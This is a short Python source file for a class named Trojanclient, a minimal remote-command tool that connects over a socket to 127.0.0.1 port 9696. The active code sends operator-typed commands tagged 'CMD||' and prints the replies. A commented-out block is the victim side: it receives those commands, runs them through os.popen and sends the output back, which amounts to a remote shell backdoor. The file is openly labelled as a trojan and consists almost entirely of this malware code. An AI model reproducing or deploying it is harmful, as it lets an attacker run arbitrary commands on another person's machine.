import socket, os, threading


class Trojanclient:
    def __init__(self):
        self.MLEN = 25565
        self.__networkinit()

    def __networkinit(self):
        host = '127.0.0.1'
        port = 9696
        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client.connect((host, port))
        receive_thread = threading.Thread(target=self.handle_data)
        receive_thread.start()

    def handle_data(self):
        while True:
            cmd_str = "CMD||" + input('Input command:')
            self.client.send(cmd_str.encode())
            data = self.client.recv(self.MLEN).decode()
            if data:
                print(data)

    # def handle_data(self):
    #     while True:
    #         data = self.client.recv(self.MLEN).decode()
    #         if data.startswith("CMD||"):
    #             a = os.popen(data.split('||')[1])
    #             feedback = a.read()
    #             print(feedback)
    #             self.client.send(feedback.encode())
    #         else:
    #             print(data)


def main():
    Trojanclient()


if __name__ == '__main__':
    main()
